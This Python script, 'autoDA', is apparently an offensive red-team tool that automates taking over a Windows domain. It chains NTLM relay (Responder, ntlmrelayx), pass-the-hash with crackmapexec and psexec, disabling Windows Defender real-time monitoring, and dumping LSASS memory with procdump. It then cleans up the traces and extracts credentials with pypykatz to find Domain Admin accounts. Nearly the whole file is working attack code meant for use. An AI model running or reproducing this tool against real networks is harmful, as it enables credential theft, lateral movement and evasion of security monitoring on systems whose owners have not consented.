#!/usr/bin/env python  
from sys import exit,argv
from subprocess import Popen, PIPE
import argparse
import os
import textwrap
import schedule
import time
import pyautogui

__author__ = [ '@fastpistol', '@chrm4n' ]
__version__ = "1.0"
__license__ = "GPLv3"
__team__ = "@PRIORITY"
__systems__ = "Windows"

message = '''
                                               88888888ba,           db         
                           ,d                  88      `"8b         d88b        
                           88                  88        `8b       d8'`8b       
,adPPYYba,  88       88  MM88MMM   ,adPPYba,   88         88      d8'  `8b      
""     `Y8  88       88    88     a8"     "8a  88         88     d8YaaaaY8b     
,adPPPPP88  88       88    88     8b       d8  88         8P    d8""""""""8b    
88,    ,88  "8a,   ,a88    88,    "8a,   ,a8"  88      .a8P    d8'        `8b   
`"8bbdP"Y8   `"YbbdP'Y8    "Y888   `"YbbdP"'   88888888Y"'    d8'          `8b  

autoDA v.{} - Automated Domain Admin pwning tool.
autoDA is an open source tool licensed under {}.
Affected systems: {}.
Written by: {} and {} of {}.
https://www.priority.com.gr
Please visit https://github.com/fastpistol/autoDA for more.
'''.format(__version__, __license__, __systems__, __author__[0], __author__[1], __team__)

def arguments(argv):
    parser = argparse.ArgumentParser(
        prog = 'autoDA.py',
        description = print(message),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent('''\
            example:
                ./autoDA.py -i eth0 -s 192.168.1.0/24
        ''')
    )

    parser.add_argument('-i', '--interface', action = 'store',help = 'Network Interface', metavar = '')
    parser.add_argument('-s', '--subnet', action = 'store', help = 'Target Subnet', metavar = '')

    args = parser.parse_args()

    if len(argv) != 5:
        parser.print_help()
        exit()

    return args

def crackmapexec(subnet):
    command = 'crackmapexec smb ' + subnet + ' --gen-relay-list smb_targets.txt'
    os.system(command)

def responder(interface):
    command = 'sudo responder -I ' + interface
    Popen(["xterm", "-geometry", "+100+100", "-e", command], stdout=PIPE, stderr=PIPE, stdin=PIPE)

def relay():
    Popen(["xterm", "-geometry", "+600+100", "-e", "impacket-ntlmrelayx -tf smb_targets.txt -smb2support"], stdout=PIPE, stderr=PIPE, stdin=PIPE)

def hashes():
    sam_counter = 0 
    for file in os.listdir('.'):
        if file.endswith('.sam'):
            sam_counter +=1
    if sam_counter == 1:
        command = "grep -rnw *.sam -e 'Administrator' | awk -F: '{print $5}' > 1_temp.txt && sort 1_temp.txt | uniq > administrator_hashes.txt"
        os.system(command)
    else:
        command = "grep -rnw *.sam -e 'Administrator' | awk -F: '{print $6}' > 1_temp.txt && sort 1_temp.txt | uniq > administrator_hashes.txt"
        os.system(command)

def pwn3d(subnet):
    file1 = open('administrator_hashes.txt', 'r')
    Hashes = file1.readlines()
    count = 0            
    for hash in Hashes:
        command = 'crackmapexec smb ' + subnet + ' -u Administrator -H :' + hash.strip() + " --local-auth | grep Pwn3d | awk -F' ' '{print $2}' >> 2_temp.txt && sort 2_temp.txt | uniq > " + hash.strip() + '_pwns.txt' 
        os.system(command)
        with open(hash.strip() + '_pwns.txt', "r") as file2:
            for ip in file2:
                print("Dumping lsass from " + ip.strip() + "\n")
                Popen(["xterm", "-e", "impacket-psexec administrator@" + ip.strip() + " -hashes :" + hash.strip()], stdout=PIPE, stderr=PIPE, stdin=PIPE)
                #Popen(["xterm", "-e", "impacket-wmiexec administrator@" + ip.strip() + " -hashes :" + hash.strip()], stdout=PIPE, stderr=PIPE, stdin=PIPE) #Stealthier
                time.sleep(10)
                #pyautogui is responsible for sending keystrokes to the spawned XTERMs, so please do not interact, since some keystrokes maybe not typed properly
                pyautogui.typewrite("lput procdump.exe\n", interval=0.1) #you can skip this step if you don't want to use procdump
                time.sleep(10)
                pyautogui.typewrite("powershell -command 'Set-MpPreference -DisableRealTimeMonitoring $true'\n", interval=0.1) #you can skip as well
                time.sleep(5)
                pyautogui.typewrite("C:\windows\procdump.exe -accepteula -r -ma lsass.exe  C:\windows\lsass.dmp\n", interval=0.1)
                #Alternate lsass dumps, you can use your method here :)
                #pyautogui.typewrite("""for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\windows\procdump.exe -accepteula -ma %J C:\windows\lsass.dmp\n""", interval=0.1)
                #pyautogui.typewrite("""for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:/windows/system32/rdrleakdiag.exe /p %J /o C:\windows\ /fullmemdmp /snap\n""", interval=0.1)
                time.sleep(30)
                pyautogui.typewrite("lget lsass.dmp\n", interval=0.1) # in case or rdrleakdiag or other tool, you should download the minidump_PID.dmp etc. and change the code in order to work properly
                time.sleep(10)
                pyautogui.typewrite("del C:\windows\lsass.dmp\n", interval=0.1)
                time.sleep(5)
                pyautogui.typewrite("del C:\windows\procdump.exe\n", interval=0.1)
                time.sleep(5)
                pyautogui.typewrite("powershell -command 'Set-MpPreference -DisableRealTimeMonitoring $false'\n", interval=0.1)
                time.sleep(5)
                pyautogui.typewrite("exit\n", interval=0.1)
                time.sleep(2)
                os.system('mv lsass.dmp ' + ip.strip() +'.dmp')
                time.sleep(2)
                   
        count += 1
    file1.close()
    command = "rm -rf *_temp.txt"
    os.system(command)
            
def katz():
    for fname in os.listdir('.'):
        if fname.endswith('.dmp'):
            command = "pypykatz lsa minidump " + fname + "> " + fname + ".txt"
            os.system(command)
    print("\nSearching for possible Domain Admins :)")
    time.sleep(1)
    print("...")
    time.sleep(1)
    print("...")
    time.sleep(1)
    print("...")
    time.sleep(1)
    print("\nBringing compromised Domain Users. Any Domain Admin(s) here? o.O")
    time.sleep(1)
    print("---------------------------------")
    command2 = "sh parser.sh > domain_users.txt"
    os.system(command2)
    time.sleep(2)
    command3 = "rm secrets.txt && cat domain_users.txt"
    os.system(command3)

def main():
    args = arguments(argv)
    print('Interface:', args.interface)
    print('Subnet:', args.subnet)
    print("\n")

    print("Creating the SMB targets list.\n")
    crackmapexec(args.subnet)

    print("Setting up your NTLM Relay.\n")
    responder(args.interface)
    relay()

    schedule.every(30).seconds.do(hashes)
    
    print("Trying to dump sam files...\n")
    while True:
            schedule.run_pending()
            time.sleep(1)
            #print("no sam files found")
            if any (fname.endswith('.sam') for fname in os.listdir('.')):
                break
    
    t_end = time.time() + 60*1
    while time.time() < t_end:
        schedule.run_pending()
        time.sleep(1)
        #print("sam file found.")

    print("Trying to dump the LSASS process from possible targets.\nPlease do not interact with the spawned XTerm Consoles.\n\n")
    pwn3d(args.subnet)

    katz()
    print("\nOrganizing your files...\n")
    command = "mkdir SAM_files LSASS_dumps l00t && mv *.sam SAM_files && mv *.dmp *.dmp.txt LSASS_dumps && mv *.txt l00t && echo 'Enjoy!!!!'"
    os.system(command)
    exit()

if __name__ == '__main__':
    main()